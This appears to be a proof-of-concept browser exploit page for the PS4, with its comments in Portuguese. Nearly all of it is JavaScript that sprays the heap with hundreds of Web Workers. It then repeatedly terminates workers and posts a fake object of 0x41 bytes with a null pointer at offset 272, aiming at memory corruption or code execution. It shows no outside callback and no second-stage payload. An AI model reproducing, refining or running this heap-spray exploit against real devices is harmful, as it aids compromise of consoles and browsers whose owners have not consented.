<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE CHECK (Offset 272)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
        h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #0f0; display: inline-block; }
        #status { font-size: 2em; border: 2px solid #fff; padding: 20px; background: #111; color: #fff; }
        .danger { background-color: #f00 !important; color: #fff !important; animation: pulse 0.2s infinite; }
        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
    </style>
</head>
<body>

    <h1>RCE VERIFICATION</h1>
    <div id="status">PREPARANDO PAYLOAD...</div>

    <script>
        const TARGET_LIMIT = 415; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 272; // O Offset Dourado
        
        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // PREPARA O OBJETO FALSO (FAKE OBJECT)
        // Tudo 0x41 (Lixo seguro para dados)
        // Offset 272 = 0x0000000000000000 (NULL POINTER EXECUTION)
        const payload = new Uint8Array(SPRAY_SIZE);
        payload.fill(0x41); 
        
        // Zera o ponteiro cr√≠tico
        for(let i=0; i<8; i++) {
            payload[TARGET_OFFSET + i] = 0x00;
        }

        function start() {
            document.getElementById('status').innerText = "ENCHENDO HEAP...";
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "ESTABILIZANDO (AGUARDE)...";
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            st.innerText = ">>> EXECUTANDO NULL POINTER <<<";
            st.className = "danger";

            setInterval(() => {
                // Cria buraco
                const w = new Worker(killerUrl);
                w.terminate();
                
                // Injeta objeto com ponteiro NULL no offset 272
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
